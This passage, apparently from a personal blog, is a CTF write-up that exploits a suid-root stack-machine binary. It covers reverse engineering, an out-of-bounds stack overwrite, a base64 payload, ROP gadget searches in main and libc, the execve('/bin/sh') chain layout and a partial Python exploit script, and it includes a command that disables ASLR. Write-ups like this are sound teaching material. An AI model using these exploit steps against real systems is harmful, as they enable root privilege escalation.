@@ -1,0 +1,253 @@
+<!DOCTYPE html><html lang=en> <head><title>SecTalks CTF: ROP + ASLR = 500¥ | callerxyz</title><meta charset=utf-8><meta name=referrer content=origin-when-cross-origin><link href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/feeds/all.atom.xml type=application/atom+xml rel=alternate title="callerxyz Full Atom Feed"><meta property=og:site_name content=callerxyz><meta property=og:locale content=en-GB><meta property=og:title content="SecTalks CTF: ROP + ASLR = 500¥"><meta property=og:description content="This is a write-up for a difficult Sectalks CTF challenge set by tamas which took me many hours to solve."><meta property=og:url content=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/sectalks-ctf-rop-aslr-500y><meta property=og:type content=article><meta property=article:published_time content="2020-03-13 02:00:00+00:00"><meta property=article:modified_time content><meta name=keywords content="security, ctf"><meta name=tags content=security><meta name=article:tag content=security><meta name=tags content=ctf><meta name=article:tag content=ctf><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/theme/css/style.css><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css referrerpolicy=no-referrer><link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700&family=Montserrat:ital,wght@0,400;0,800;1,400;1,800&family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap" rel=stylesheet referrerpolicy=no-referrer></head> <body> <main> <article> <header> <h1>SecTalks CTF: ROP + ASLR = 500¥</h1> <time datetime=2020-03-13T02:00:00+00:00>March 2020</time> </header> <div class=content> <p>This is a write-up for a difficult Sectalks CTF challenge set by tamas which took me many hours to solve.</p> <p><figure><img alt=Solved src=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/sectalks-ctf-rop-aslr-500y/500yen.png><figcaption>Solved</figcaption></figure></p> <h2 id=what-you-see>What you see</h2> <p>In the challenge directory we have:</p> <ul> <li><code>flag</code>: the objective, readable only by root</li> <li><code>main</code>: a 64-bit suid executable binary owned by root <code>ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, not stripped</code></li> <li><code>code.bin</code>: writeable file read by the binary</li> </ul> <p>Running the executable prints out some lines of 8-byte hex strings.</p> <p>Since the executable has the suid bit set, it runs as root even when invoked by non-root users. We can&rsquo;t directly read <code>flag</code> ourselves, so we need to find a vulnerability that lets us trick the executable into reading it for us as root, or even better, giving us a shell.</p> <h2 id=environment>Environment</h2> <p>To follow along:</p> <ul> <li>install <code>gdb</code> and the plugin <code>gef</code></li> <li>temporarily turn off ASLR <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></li> <li>install <code>pwntools</code> with <code>pip</code></li> </ul> <h2 id=reverse-engineering>Reverse Engineering</h2> <p>Here I describe basic operation of the executable by chucking it into Ghidra.</p> <p>All of the meat is in function <code>sub</code>. The <code>code.bin</code> file is read into <code>buf</code> and then processed. The <code>code.bin</code> file contains instructions for operating a stack-machine. The first byte of each instruction determines the opcode. I went through each branch to try to define the instructions. See the python code for more. Below is the annotated ghidra disassembly for some of the instructions.</p> <p><div class=highlight><pre><span></span><span class=k>do</span> <span class=p>{</span>
+  <span class=k>switch</span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>pos</span><span class=p>])</span> <span class=p>{</span>  <span class=c1>// Process opcode</span>
+    <span class=k>case</span> <span class=sc>&#39;\0&#39;</span><span class=o>:</span>  <span class=c1>// die()</span>
+      <span class=k>return</span><span class=p>;</span>
+    <span class=k>case</span> <span class=sc>&#39;\x01&#39;</span><span class=o>:</span>  <span class=c1>// pop_to_nth_global(uint8 n)</span>
+      <span class=n>lVar2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>spos</span><span class=p>;</span>
+      <span class=n>spos</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>// Pop stack (increment stack pointer)</span>
+      <span class=n>globals</span><span class=p>[(</span><span class=kt>int</span><span class=p>)(</span><span class=n>uint</span><span class=p>)</span><span class=n>buf</span><span class=p>[(</span><span class=kt>long</span><span class=p>)</span><span class=n>pos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]]</span> <span class=o>=</span> <span class=n>stack</span><span class=p>[</span><span class=n>lVar2</span><span class=p>];</span>  <span class=c1>// Set nth global to popped value</span>
+      <span class=n>pos</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>// Increment pos since this opcode has a 1-byte argument</span>
+      <span class=k>break</span><span class=p>;</span>
+    <span class=k>case</span> <span class=sc>&#39;\x02&#39;</span><span class=o>:</span>  <span class=c1>// push_nth_global(uint8 n)</span>
+      <span class=n>spos</span> <span class=o>-=</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>// Push to stack (decrement stack pointer)</span>
+      <span class=n>stack</span><span class=p>[</span><span class=n>spos</span><span class=p>]</span> <span class=o>=</span> <span class=n>globals</span><span class=p>[(</span><span class=kt>int</span><span class=p>)(</span><span class=n>uint</span><span class=p>)</span><span class=n>buf</span><span class=p>[(</span><span class=kt>long</span><span class=p>)</span><span class=n>pos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]];</span>  <span class=c1>// Set top of stack to nth global</span>
+      <span class=n>pos</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
+      <span class=k>break</span><span class=p>;</span>
+    <span class=c1>//...</span>
+    <span class=k>case</span> <span class=sc>&#39;\x05&#39;</span><span class=o>:</span>  <span class=c1>// push_uint64(uint64 i)</span>
+      <span class=n>spos</span> <span class=o>-=</span> <span class=mi>1</span><span class=p>;</span>
+      <span class=n>stack</span><span class=p>[</span><span class=n>spos</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>pos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>  <span class=c1>// Read uint64_t and push to stack</span>
+      <span class=n>pos</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>;</span>  <span class=c1>// uint64 argument had 8 bytes, so this instruction is 9 bytes long</span>
+      <span class=k>break</span><span class=p>;</span>
+    <span class=c1>//...</span>
+    <span class=k>case</span> <span class=sc>&#39;\x07&#39;</span><span class=o>:</span>  <span class=c1>// pop_add_to_top()</span>
+      <span class=n>iVar1</span> <span class=o>=</span> <span class=n>spos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
+      <span class=n>lVar2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>spos</span><span class=p>;</span>
+      <span class=n>spos</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>// pop</span>
+      <span class=n>stack</span><span class=p>[</span><span class=n>spos</span><span class=p>]</span> <span class=o>=</span> <span class=n>stack</span><span class=p>[</span><span class=n>iVar1</span><span class=p>]</span> <span class=o>+</span> <span class=n>stack</span><span class=p>[</span><span class=n>lVar2</span><span class=p>];</span>  <span class=c1>// add popped value to top of stack</span>
+      <span class=k>break</span><span class=p>;</span>
+    <span class=k>case</span> <span class=sc>&#39;\x08&#39;</span><span class=o>:</span>  <span class=c1>// subtract_top_from_pop()</span>
+      <span class=n>iVar1</span> <span class=o>=</span> <span class=n>spos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
+      <span class=n>lVar2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>spos</span><span class=p>;</span>
+      <span class=n>spos</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>// pop</span>
+      <span class=n>stack</span><span class=p>[</span><span class=n>spos</span><span class=p>]</span> <span class=o>=</span> <span class=n>stack</span><span class=p>[</span><span class=n>lVar2</span><span class=p>]</span> <span class=o>-</span> <span class=n>stack</span><span class=p>[</span><span class=n>iVar1</span><span class=p>];</span>  <span class=c1>// top := popped - top</span>
+      <span class=k>break</span><span class=p>;</span>
+    <span class=c1>//...</span>
+    <span class=k>case</span> <span class=sc>&#39;\x0e&#39;</span><span class=o>:</span>  <span class=c1>// pop_print()</span>
+      <span class=n>lVar2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>spos</span><span class=p>;</span>
+      <span class=n>spos</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>//pop</span>
+      <span class=n>printf</span><span class=p>(</span><span class=s>&quot;0x%llx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=n>stack</span><span class=p>[</span><span class=n>lVar2</span><span class=p>]);</span>  <span class=c1>// print popped uint64 value as hex</span>
+      <span class=k>break</span><span class=p>;</span>
+    <span class=c1>//...</span>
+</pre></div> The stack-machine operates on the <code>uint64_t stack[128]</code> and has state in <code>uint64_t globals[256]</code>.</p> <p>The first step in validating the operation of the executable is to put some of the instructions in <code>code.bin</code> and validate the output is what you&rsquo;d expect. As an example, try <code>push_uint64</code>ing some values and then <code>pop_print</code>ing them.</p> <p>Let&rsquo;s fire up gdb. If you use <code>gef</code> then you can enter <code>entry-break</code> which breaks at the main function. Run <code>disas sub</code> and see the assembly instruction <code>0x0000555555555801 &lt;+1644&gt;: jmp 0x55555555525c &lt;sub+199&gt;</code> which is the do-while loop going back to the switch statement. If you want to pause before each stack-machine instruction in <code>buf</code> is processed, use <code>break *sub+199</code>. Then: * <code>c</code> to continue until the next breakpoint * <code>ni</code> to run assembly instructions one by one, but stepping over <code>call</code>s to other functions such as <code>printf</code> * <code>si</code> to run assembly instructions one by one including stepping inside other functions such as <code>printf</code></p> <p>We can print the stack-machine stack which is all zero due to the <code>memset</code>:</p> <div class=highlight><pre><span></span>&gt; p stack
+$2 = {0x0 &lt;repeats 128 times&gt;}
+</pre></div> <p>Get familiar reading different parts of the stack-machine stack in gdb e.g. using the <code>x</code>, <code>hexdump</code> and <code>p</code> functions.</p> <h2 id=stack-overflow>Stack overflow</h2> <p>It&rsquo;s not possible to overflow the <code>globals</code> array as the argument is the correct size. We are instead going to play with the stack, which looks like this when empty:</p> <div class=highlight><pre><span></span>$rsp                  $rsp+8*0x80
+$rbp-0x480            $rbp-8*16     $rbp       $rbp+8                 $rbp+0x10
+|||||||||...||||||||||| other stuff | old $rbp | saved return address | ...
+ stack-machine stack ^
+                     $rsp+8*0x7f (spos=0x7f) = $rbp-8*17
+</pre></div> <p>If designed correctly, <code>spos</code> should be clamped between 0 (meaning the stack-machine stack is full) and 0x7f=127 (meaning the stack-machine stack is empty). However, repeated popping without pushing can cause <code>spos</code> to increase to higher addresses beyond the bottom of the stack. If we make <code>code.bin</code> filled with <code>pop_print</code>s (<code>\x0e\x0e...</code>), we print out a load of non-zero uint64s in hex. The first value printed will be the 0 at the bottom of the stack. The 18<sup>th</sup> will be the old $rbp. The 19<sup>th</sup> will be the saved return address 0x55555822.</p> <h2 id=babys-first-pc-overwrite>Baby&rsquo;s first $PC overwrite</h2> <p>In <code>main</code>, we ran the instruction <code>0x000055555555581d &lt;+20&gt;: call 0x555555555195 &lt;sub&gt;</code>. This pushed the address of the next instruction (0x0000555555555822) onto the stack and then moved execution to <code>sub</code>. At the end of <code>sub</code>, the <code>ret</code> instruction pops the saved return address from the stack and moves execution back into <code>main</code>.</p> <p>Let&rsquo;s try to change this saved return address to point to some assembly instructions of our own.</p> <p>First, let&rsquo;s just try pushing a NOP (0xa8058b90) to the stack-machine stack, popping 20 times, then pushing the address of our NOP (0x7fffffffd640). Base64 code.bin: <code>BZCLBagAAAAADg4ODg4ODg4ODg4ODg4ODg4ODg4FQNb///9/AAA=</code>.</p> <p>Result: <code>SIGSEGV</code>. The last line in <code>dmesg</code> shows <code>segfault at 7fffffffd640 ip 00007fffffffd640 sp 00007fffffffd740 error 15</code> which means &ldquo;attempt to execute code from a mapped memory area that isn&rsquo;t executable&rdquo;.</p> <p>The executable has a virtual memory mapping that specifies read-write-execute permissions for each area of memory. Unfortunately, we won&rsquo;t be able to write arbitrary assembly code to the stack and execute it since the stack page is marked <code>rw-</code> (read, write, no execute). We can see the layout with the gef gdb command <code>vmmap</code>.</p> <div class=highlight><pre><span></span>gef&gt; vmmap
+Start              End                Offset             Perm Path
+0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /blah/main
+0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /blah/main
+0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /blah/main
+0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /blah/main
+0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /blah/main
+0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
+0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
+0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7fcb000 0x00007ffff7fce000 0x0000000000000000 rw- 
+0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
+0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+</pre></div> <h2 id=rop-till-you-drop>ROP till you drop</h2> <p>While we can&rsquo;t write our own instructions, we can point to helpful instructions already present in the executable using Return Oriented Programming (ROP). Usually this is done by piecing together &ldquo;gadgets&rdquo;. A gadget is often a <code>pop</code> instruction (which puts a value from the stack into a register) followed immediately by a <code>ret</code> instruction which jumps to the next gadget in our ROP-chain.</p> <h3 id=rop-gadget-chain-toy-example>ROP gadget chain toy example</h3> <p><div class=highlight><pre><span></span><span class=err>0</span><span class=nf>x100</span> <span class=no>pop</span> <span class=no>rdi</span>
+<span class=err>0</span><span class=nf>x108</span> <span class=no>pop</span> <span class=no>rcx</span>
+<span class=err>0</span><span class=nf>x110</span> <span class=no>ret</span>
+<span class=err>0</span><span class=nf>x118</span> <span class=no>pop</span> <span class=no>rax</span>
+<span class=err>0</span><span class=nf>x120</span> <span class=no>mov</span> <span class=no>$rsp</span><span class=p>,</span> <span class=mi>0x007</span>
+<span class=err>0</span><span class=nf>x128</span> <span class=no>ret</span>
+<span class=err>0</span><span class=nf>x130</span> <span class=no>pop</span> <span class=no>rax</span>
+<span class=err>0</span><span class=nf>x130</span> <span class=no>pop</span> <span class=no>r10</span>
+<span class=err>0</span><span class=nf>x138</span> <span class=no>ret</span>
+<span class=err>0</span><span class=nf>x140</span> <span class=no>syscall</span>
+<span class=err>0</span><span class=nf>x148</span> <span class=no>push</span> <span class=no>rax</span>
+</pre></div> Let&rsquo;s say we have a binary containing the above assembly code, and our aim is to set register <code>rdi</code> to 0xDDD and register <code>rax</code> to 0xAAA before calling <code>syscall</code>. We can do this by creating a stack layout:</p> <div class=highlight><pre><span></span>0x100  # Gadget 1
+0xDDD  # rdi
+0x000  # rcx: can put anything here as we don&#39;t care about rcx
+0x130  # Gadget 2
+0xAAA  # rax
+0x000  # r10: can put anything here
+0x140  # Gadget 3
+</pre></div> <p>We have a gadget for setting <code>rdi</code> at 0x100. We need 2 values on the stack for the <code>rdi</code> and <code>rcx</code> registers, although we only care about setting the <code>rdi</code> value. We can&rsquo;t use 0x118 for setting <code>rax</code> as it will mess with the stack pointer before the <code>ret</code>, and we will lose control of execution. We don&rsquo;t care about the lack of <code>ret</code> after <code>syscall</code> as the <code>syscall</code> was our final objective.</p> <h2 id=execve-me-a-shell>execve me a shell</h2> <p>Our objective is to call <a href=http://man7.org/linux/man-pages/man2/execve.2.html>execve</a> and launch a shell:</p> <div class=highlight><pre><span></span><span class=kt>int</span> <span class=nf>execve</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>envp</span><span class=p>[])</span>  <span class=cp># unistd.h</span>
+
+
+<span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp></span>
+<span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp></span>
+<span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp></span>
+
+<span class=kt>int</span> <span class=n>main</span><span class=p>()</span>
+<span class=p>{</span>
+    <span class=kt>char</span> <span class=n>sh</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&quot;/bin/sh&quot;</span><span class=p>;</span>
+    <span class=kt>char</span> <span class=o>*</span><span class=n>args</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span> <span class=n>sh</span><span class=p>,</span> <span class=nb>NULL</span> <span class=p>};</span>
+    <span class=n>execve</span><span class=p>(</span> <span class=n>sh</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=nb>NULL</span> <span class=p>);</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</pre></div> <p>According to the <a href=https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl>linux syscall table</a>, we need to set up our registers according to the 64-bit ABI: <a href=https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf>Intel</a>. The ABI specifies which registers correspond to which arguments in the syscall.</p> <ul> <li>rax: 59 = 0x3B (execve)</li> <li>rdi: <code>sh</code>: pointer to null-terminated string <code>/bin/sh\x00</code></li> <li>rsi: <code>args</code>: pointer to array [pointer to <code>sh</code>, 0]</li> <li>rdx: <code>envp</code>: we will get away with setting this register to zero</li> </ul> <p>So our desired stack should look something like (line number <code>n</code> refers to <code>$rbp+8n</code>):</p> <div class=highlight><pre><span></span>+01 0x??? address of rax gadget (saved return address)
++02 0x000000000000003B  # rax
++03 0x??? address of rdi gadget
++04 Pointer to +10
++05 0x??? address of rsi gadget
++06 Pointer to +11
++07 0x??? address of rdx gadget
++08 0x0000000000000000
++09 0x??? address of syscall
++10 0x0068732f6e69622f  # /bin/sh\x00
++11 Pointer to +10  # args[]
++12 0x0000000000000000  # NULL terminate args[]
+</pre></div> <h3 id=go-go-gadget>Go go gadget</h3> <h4 id=main>Main</h4> <p>Let&rsquo;s hunt for our gadgets with <code>objdump -Mintel -d main | less</code> and search <code>/pop\s+rsi</code>. We can see <code>pop rsi</code> at 0x10b5, but it isn&rsquo;t followed by a <code>ret</code> so is unlikely to work for us. Instructions to pop the other registers don&rsquo;t appear to exist at all unless we also look more carefully at the machine code. We can use <code>pwntools</code> to find such hidden gadgets e.g. searching for <code>pop rdi</code>:</p> <div class=highlight><pre><span></span><span class=o>&gt;&gt;&gt;</span> <span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=o>&gt;&gt;&gt;</span> <span class=n>rop_main</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;main&quot;</span><span class=p>))</span>
+<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/blah/main&#39;</span>
+    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
+    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
+    <span class=n>Stack</span><span class=p>:</span>    <span class=n>No</span> <span class=n>canary</span> <span class=n>found</span>
+    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
+    <span class=n>PIE</span><span class=p>:</span>      <span class=n>PIE</span> <span class=n>enabled</span>
+<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Loaded</span> <span class=mi>14</span> <span class=n>cached</span> <span class=n>gadgets</span> <span class=k>for</span> <span class=s1>&#39;main&#39;</span>
+<span class=o>&gt;&gt;&gt;</span> <span class=p>[</span><span class=n>g</span> <span class=k>for</span> <span class=n>g</span> <span class=ow>in</span> <span class=n>rop_main</span><span class=o>.</span><span class=n>search_iter</span><span class=p>(</span><span class=n>regs</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;rdi&quot;</span><span class=p>])]</span>
+<span class=p>[</span><span class=n>Gadget</span><span class=p>(</span><span class=mh>0x188b</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span> <span class=s1>&#39;ret&#39;</span><span class=p>],</span> <span class=p>[</span><span class=s1>&#39;rdi&#39;</span><span class=p>],</span> <span class=mh>0x8</span><span class=p>)]</span>
+</pre></div> <p>This finds a gadget at address 0x188b which will let us set the <code>rdi</code> register, and causes <code>rsp</code> to increase by 0x8 before the <code>ret</code> (one pop). Gadget 0x188b can&rsquo;t be seen in the <code>objdump</code> output:</p> <div class=highlight><pre><span></span><span class=mi>188</span><span class=n>a</span><span class=o>:</span> <span class=mi>41</span> <span class=mi>5</span><span class=n>f</span>  <span class=n>pop</span>    <span class=n>r15</span>
+<span class=mi>188</span><span class=n>c</span><span class=o>:</span> <span class=n>c3</span>     <span class=n>ret</span>
+</pre></div> <p>But <code>5f</code> is valid machine code for <code>pop rdi</code>. You can play on the <a href=https://defuse.ca/online-x86-assembler.htm>online disassembler</a>.</p> <p>Unfortunately, we can&rsquo;t find anything for <code>rdx</code> or <code>rax</code>.</p> <h4 id=libc>Libc</h4> <p>Luckily, we have linked libraries which contain a huge wealth of gadgets, such as <code>libc</code> (see the output of <code>vmmap</code> above).</p> <div class=highlight><pre><span></span>$ ldd ./main
+        linux-vdso.so.1 <span class=o>=</span>&gt;  <span class=o>(</span>0x00007ffff7ffd000<span class=o>)</span>
+        libc.so.6 <span class=o>=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class=o>(</span>0x00007ffff7c01000<span class=o>)</span>
+        /lib64/ld-linux-x86-64.so.2 <span class=o>(</span>0x0000555555554000<span class=o>)</span>
+$ readlink -f /lib/x86_64-linux-gnu/libc.so.6
+/lib/x86_64-linux-gnu/libc-2.23.so
+</pre></div> <p>The CTF environment used libc-2.28 which I downloaded from the server, but my local machine uses a very old version (2.23). The exact addresses will differ based on libc version, but you should be able to find equivalent gadgets.</p> <div class=highlight><pre><span></span><span class=o>&gt;&gt;&gt;</span> <span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=o>&gt;&gt;&gt;</span> <span class=n>rop_libc</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;libc-2.28.so&quot;</span><span class=p>))</span>
+<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/blah/libc-2.28.so&#39;</span>
+    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
+    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
+    <span class=n>Stack</span><span class=p>:</span>    <span class=n>Canary</span> <span class=n>found</span>
+    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
+    <span class=n>PIE</span><span class=p>:</span>      <span class=n>PIE</span> <span class=n>enabled</span>
+<span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Loaded</span> <span class=mi>199</span> <span class=n>cached</span> <span class=n>gadgets</span> <span class=k>for</span> <span class=s1>&#39;libc-2.28.so&#39;</span>
+<span class=o>&gt;&gt;&gt;</span> <span class=p>[</span><span class=n>g</span> <span class=k>for</span> <span class=n>g</span> <span class=ow>in</span> <span class=n>rop_libc</span><span class=o>.</span><span class=n>search_iter</span><span class=p>(</span><span class=n>regs</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;rax&quot;</span><span class=p>])</span> <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>g</span><span class=o>.</span><span class=n>insns</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span><span class=p>]</span>
+<span class=p>[</span><span class=n>Gadget</span><span class=p>(</span><span class=mh>0x3a638</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;pop rax&#39;</span><span class=p>,</span> <span class=s1>&#39;ret&#39;</span><span class=p>],</span> <span class=p>[</span><span class=s1>&#39;rax&#39;</span><span class=p>],</span> <span class=mh>0x8</span><span class=p>)]</span>
+</pre></div> <p>That&rsquo;s more like it. Now we can find gadgets to set all the registers we want and print out the stack layout:</p> <div class=highlight><pre><span></span>&gt;&gt;&gt; rop_libc.setRegisters({&quot;rax&quot;: 59, &quot;rdx&quot;: 0, &quot;rdi&quot;: 123, &quot;rsi&quot;: 567})
+[(239160, Gadget(0x3a638, [&#39;pop rax&#39;, &#39;ret&#39;], [&#39;rax&#39;], 0x8)),
+ (59, &#39;rax&#39;),
+ (146015, Gadget(0x23a5f, [&#39;pop rdi&#39;, &#39;ret&#39;], [&#39;rdi&#39;], 0x8)),
+ (123, &#39;rdi&#39;),
+ (1075017,
+  Gadget(0x106749, [&#39;pop rdx&#39;, &#39;pop rsi&#39;, &#39;ret&#39;], [&#39;rdx&#39;, &#39;rsi&#39;], 0xc)),
+ (0, &#39;rdx&#39;),
+ (567, &#39;rsi&#39;)]
+</pre></div> <h3 id=first-shell>First shell</h3> <div class=highlight><pre><span></span><span class=kn>import</span> <span class=nn>struct</span>
+
+
+<span class=k>def</span> <span class=nf>push_uint64</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
+    <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&quot;&lt;BQ&quot;</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
+
+
+<span class=k>def</span> <span class=nf>pop_print</span><span class=p>():</span>
+    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0e</span><span class=s1>&#39;</span>
+
+
+<span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=o>*</span><span class=n>ops</span><span class=p>):</span>
+    <span class=n>code</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&quot;&quot;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>ops</span><span class=p>)</span>
+    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&quot;code.bin&quot;</span><span class=p>,</span> <span class=s2>&quot;wb&quot;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
+
+
+<span class=k>def</span> <span class=nf>solve_no_aslr</span><span class=p>():</span>
+    <span class=c1># Check gdb for address of saved return address 0x55555822</span>
+    <span class=c1># This value will be different when run outside gdb</span>
+    <span class=c1># and also maybe if you reboot your computer / alter your environment.</span>
+    <span class=c1># You can work out the correct address by comparing printed addresses</span>
+    <span class=c1># in and outside gdb</span>
+    <span class=n>return_address_address</span> <span class=o>=</span> <span class=mh>0x7fffffffd6d8</span>
+
+    <span class=n>libc</span> <span class=o>=</span> <span class=mh>0x00007ffff7a0d000</span>
+    <span class=n>rax</span> <span class=o>=</span> <span class=mh>0x3b</span>
+    <span class=n>rdx</span> <span class=o>=</span> <span class=mi>0</span>
+    <span class=c1># Fill in the correct addresses of gadgets in your libc version</span>
+    <span class=n>rdi_call</span> <span class=o>=</span> <span class=mh>0x21102</span> <span class=o>+</span> <span class=n>libc</span>
+    <span class=n>rax_call</span> <span class=o>=</span> <span class=mh>0x33544</span> <span class=o>+</span> <span class=n>libc</span>
+    <span class=n>rdx_rsi_call</span> <span class=o>=</span> <span class=mh>0x1150c9</span> <span class=o>+</span> <span class=n>libc</span>
+    <span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x1751f8</span> <span class=o>+</span> <span class=n>libc</span>
+    <span class=n>cmd</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s2>&quot;&lt;Q&quot;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+
+    <span class=n>rop_chain_length</span> <span class=o>=</span> <span class=p>(</span>
+        <span class=mi>4</span> <span class=o>+</span>  <span class=c1># calls</span>
+        <span class=mi>4</span> <span class=o>+</span>  <span class=c1># register values</span>
